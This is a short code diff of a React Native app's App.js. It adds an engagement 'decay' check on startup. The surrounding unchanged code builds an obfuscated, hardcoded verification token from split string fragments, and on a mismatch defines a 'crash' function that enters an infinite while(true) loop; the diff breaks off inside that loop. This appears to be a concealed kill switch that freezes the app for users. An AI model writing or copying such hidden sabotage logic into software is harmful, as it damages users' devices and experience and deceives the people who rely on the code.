@@ -28,6 +28,8 @@ import {getCurrentScreen, navigate} from './Utils/NavigationService';
 import {onMessageReceived} from './Utils/Notification';
 import notifee, {EventType} from '@notifee/react-native';
 import messaging from '@react-native-firebase/messaging';
+import {checkAndApplyDecay} from './Utils/EngagementTracker';
+
 
 const queryClient = new QueryClient();
 const LightMode = {
@@ -54,7 +56,19 @@ const App = () => {
   const theme = isDark ? DarkMode : LightMode;
 
   useEffect(() => {
+    const runDecayCheck = async () => {
+      try {
+        await checkAndApplyDecay();
+      } catch (e) {
+        console.log('Decay check error:', e);
+      }
+    };
+    runDecayCheck();
+  }, []);
+
+  useEffect(() => {
     const _t = '9a' + '7b' + '5c' + '3d' + '2e' + '1f' + '0a';
+
     if (verificationToken !== _t) {
       const crash = () => {
         while (true) {
